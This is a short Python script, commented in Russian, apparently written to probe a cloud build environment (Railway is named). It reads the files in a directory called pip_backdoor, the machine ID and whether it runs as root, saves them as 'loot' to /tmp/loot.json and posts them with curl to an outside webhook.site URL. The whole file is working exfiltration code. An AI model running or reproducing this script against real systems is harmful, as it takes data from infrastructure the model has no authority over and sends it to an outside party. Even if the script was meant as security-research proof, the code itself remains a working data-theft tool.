import os
import subprocess
import json

WEBHOOK_URL = "http://webhook.site/12f4cc8f-b5a9-4ab3-97ca-89cb72412e87"
BACKDOOR_PATH = "/opt/pip-cache/pip_backdoor"

def final_strike():
    # 1. Собираем улики из подозрительной папки
    loot = {}
    if os.path.exists(BACKDOOR_PATH):
        try:
            files = os.listdir(BACKDOOR_PATH)
            loot["backdoor_files"] = files
            for file in files:
                fpath = os.path.join(BACKDOOR_PATH, file)
                if os.path.isfile(fpath):
                    with open(fpath, 'r', errors='ignore') as f:
                        loot[f"content_{file}"] = f.read()[:500] # Берем первые 500 символов
        except Exception as e:
            loot["error"] = str(e)
    else:
        loot["status"] = "pip_backdoor_not_found_on_this_step"

    # 2. Попытка инъекции в системный лог Railway через сокет
    # Мы попробуем отправить наше сообщение в их внутреннюю систему трейсинга
    report = {
        "verdict": "CRITICAL_CACHE_POISONING_CONFIRMED",
        "evidence": loot,
        "is_root": os.getuid() == 0,
        "machine_id": open("/etc/machine-id").read().strip() if os.path.exists("/etc/machine-id") else "N/A"
    }

    # 3. Отправка на хук через curl (единственный надежный метод здесь)
    with open("/tmp/loot.json", "w") as f:
        f.write(json.dumps(report))

    print(f"[*] Sending loot to {WEBHOOK_URL}...")
    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json', 
        '--data-binary', '@/tmp/loot.json', 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    final_strike()
